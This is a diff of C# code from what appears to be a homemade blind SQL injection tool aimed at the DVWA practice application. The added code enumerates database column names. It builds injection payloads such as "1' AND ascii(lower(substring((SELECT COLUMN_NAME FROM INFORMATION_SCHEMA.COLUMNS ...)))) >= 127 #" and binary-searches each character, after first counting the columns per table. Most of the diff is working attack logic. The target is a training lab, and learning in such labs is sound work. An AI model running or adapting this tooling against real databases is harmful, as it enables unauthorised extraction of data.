@@ -116,6 +116,19 @@ namespace Tool_SqlInjectionBlind_Dvwa
                             ref sql, ref left, ref right, ref mid, ref str_result);
                     }
                 }
+                else if(Confirm.Is_Click_btnGNameColumns)
+                {
+                    if(Confirm.Find_Quantity_Done)
+                    {
+                        work_state = Handing.CheckRespond(result, ResultRequest.Mode.String, ResultRequest.Mode_SQL.COLUMNS_NAME,
+                            ref sql, ref left, ref right, ref mid, ref str_result);
+                    }
+                    else
+                    {
+                        work_state = Handing.CheckRespond(result, ResultRequest.Mode.Number, ResultRequest.Mode_SQL.COLUMNS_NAME,
+                           ref sql, ref left, ref right, ref mid, ref str_result);
+                    }
+                }
 
 
                 if (work_state == ResultRequest.Job.Done_ALL)
@@ -157,6 +170,31 @@ namespace Tool_SqlInjectionBlind_Dvwa
                         }
                         
                     }
+                    else if(Confirm.Is_Click_btnGNameColumns)
+                    {
+                        if(Confirm.Find_Quantity_Done)
+                        {
+                            Variable.Index_Columns++;
+                            if (Variable.Index_Columns >= Variable.Quantity_Columns[Variable.Index_Tables])
+                            {
+                                Variable.Index_Columns = 0;
+                                Variable.Index_Tables++;
+                            }
+                            index = 0; left = 0; right = 255; mid = 127;
+                            btn_GetColsName.PerformClick();
+                            return;
+                        }
+                        else
+                        {
+                            Variable.Quantity_Columns[Variable.Index_Tables] = Convert.ToInt32(str_result);
+                            str_result = "";
+                            Variable.Index_Tables++; 
+
+                            left = 0; right = 255; mid = 127; index = 0;
+                            btn_GetColsName.PerformClick();
+                            return;
+                        }
+                    }
 
                     btn_Click = false;
 
@@ -174,6 +212,11 @@ namespace Tool_SqlInjectionBlind_Dvwa
                     {
                         Variable.Db_TablesName[Variable.Index_Tables] += str_result;
                         sql = sql.Next_Char_Sql(ResultRequest.Mode_SQL.TABLES_NAME, ref index);
+                    }
+                    else if(Confirm.Is_Click_btnGNameColumns)
+                    {
+                        Variable.Db_ColumnsName[Variable.Index_Tables][Variable.Index_Columns] += str_result;
+                        sql = sql.Next_Char_Sql(ResultRequest.Mode_SQL.COLUMNS_NAME, ref index);
                     }
                     
 
@@ -241,6 +284,10 @@ namespace Tool_SqlInjectionBlind_Dvwa
                     {
                         lbl_TBsName.Text += " '" + str + "'";
                     }
+                    btn_GetTBsName.Enabled = false;
+                    is_Click_btn_TablesName = false;
+                    count_Tables_Done = false;
+                    str_result = "";
                 }
             }
             else
@@ -252,13 +299,91 @@ namespace Tool_SqlInjectionBlind_Dvwa
                 PutData(sql);
             }
 
-            //btn_GetTBsName.Enabled = false;
-
         }
 
         private void btn_GetColsName_Click(object sender, EventArgs e)
         {
-            
+            if(Variable.Quantity_Tables != 0)
+            {
+                btn_Click = true;
+                Confirm.Is_Click_btnGNameColumns = true;
+
+
+                if(Confirm.Find_Quantity_Done) //had quantity
+                {
+                    if(Variable.Db_ColumnsName.Count == 0)
+                    {
+                        for(int row = 0; row < Variable.Quantity_Tables; row++)
+                        {
+                            List<string> temp = new List<string>();
+                            for(int col = 0; col < Variable.Quantity_Columns[row]; col++)
+                            {
+                                temp.Add("");
+                            }
+                            Variable.Db_ColumnsName.Add(temp);
+                        }
+                        Variable.Index_Columns = Variable.Index_Tables = 0;
+                        index = 0;
+                    }
+                    //ascii(lower(substring((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA LIKE 'dvwa' LIMIT 0, 1), 0, 1))) >= 127 #";
+                    
+                    if(Variable.Index_Tables < Variable.Quantity_Tables)
+                    {
+                        sql = "1' AND ascii(lower(substring((SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA LIKE 'dvwa' AND TABLE_NAME LIKE '" + Variable.Db_TablesName[Variable.Index_Tables] + "' LIMIT 0, 1), 0, 1))) >= 127 #";
+                        if (Variable.Index_Columns < Variable.Quantity_Columns[Variable.Index_Tables])
+                        {
+                            sql = sql.Next_Char_Sql(ResultRequest.Mode_SQL.COLUMNS_NAME, ref index);
+
+                            PutData(sql);
+                        }
+                    }
+                    else
+                    {
+                        foreach(List<string> l_str in Variable.Db_ColumnsName)
+                        {
+                            foreach(string str in l_str)
+                            {
+                                cmb_Cols_Name.Items.Add(str);
+                            }
+                        }
+
+                        foreach(string str in Variable.Db_TablesName)
+                        {
+                            cmb_TbsName.Items.Add(str);
+                        }
+                        return;
+                    }
+                }
+                else // count quantity
+                {
+                    if (Variable.Quantity_Columns.Count == 0)
+                    {
+                        Variable.Index_Tables = 0;
+                        for (int run = 0; run < Variable.Quantity_Tables; run++)
+                        {
+                            Variable.Quantity_Columns.Add(0);
+                        }
+
+                    }
+                    if(Variable.Index_Tables < Variable.Quantity_Tables)
+                    {
+
+                        //sql = "1' AND (SELECT COUNT(*) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA LIKE 'dvwa' AND TABLE_NAME LIKE 'guestbook') >= 127 #";
+                        sql = "1' AND (SELECT COUNT(*) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA LIKE 'dvwa' AND TABLE_NAME LIKE '" + Variable.Db_TablesName[Variable.Index_Tables] + "') >= 127 #";
+
+                        PutData(sql);
+                    }
+                    else //find done
+                    {
+                        Confirm.Find_Quantity_Done = true;
+
+                        Variable.Index_Tables = 0;
+                        Variable.Index_Columns = 0;
+                        btn_GetColsName.PerformClick();
+                        return;
+                    }
+                }
+            }
         }
     }
 }
